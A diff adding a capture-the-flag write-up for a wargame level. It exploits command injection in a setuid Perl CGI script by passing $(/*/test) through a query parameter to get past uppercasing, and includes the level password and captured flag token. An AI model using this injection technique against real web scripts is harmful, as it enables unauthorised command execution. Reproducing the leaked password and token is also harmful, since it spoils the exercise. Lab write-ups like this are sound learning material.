@@ -1,0 +1,47 @@
+login/pw:
+	level12 : fa6v5ateaw21peobuub8ipe6s
+
+RESOLUTION:
+	ls -l
+		=> -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+			=> Let's read then
+	netstat -plunt
+		=> tcp6       0      0 :::4646                 :::*
+			=> Indeed a server is listening on port 4646
+	cat level12.pl
+		=> query string params are x and y
+		=> t(x, y)
+		=> @output = `egrep "^$xx" /tmp/xd 2>&1`;
+			=> Looks like a bash command
+			=> xx being the first function argument which got modified
+		=> Whatever happens, the output will be "." or ".."
+	perl test.pl
+		=> Reproduces the regex locally
+			=> $xx =~ tr/a-z/A-Z/;
+				=> translate lowercase to uppercase
+			=> $xx =~ s/\s.*//;
+				=> substitute all that follows a space with an empty string
+		=> Then it is passed to the interpreted @output line
+	Lets sum up:
+		querystring = x=&y=whatever
+
+		=> Our query string must be in the form of $(...) or `...` to be interpreted
+		querystring = x=$()&y=whatever
+
+		=> toupper(x) must give an executable
+			=> We can only create a file in /tmp
+			=> /tmp would become /TMP
+			=> Need an non alpha
+		querystring = x=$(/*/test)&y=whatever		
+				=> will become /*/TEST
+		=> We need to redirect the output as we wont have it through the webpage
+			=> we could redirect it through the query string but it's easier to do it through the executable
+
+	echo 'getflag > /tmp/res' > /tmp/TEST
+	chmod 755 /tmp/TEST
+	Encode url:
+		=> $(/*/test) = %24%28%2F%2A%2Ftest%29
+	http://[IP]?x=%24%28%2F%2A%2Ftest%29&y=whatever
+	cat /tmp/res
+		=> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
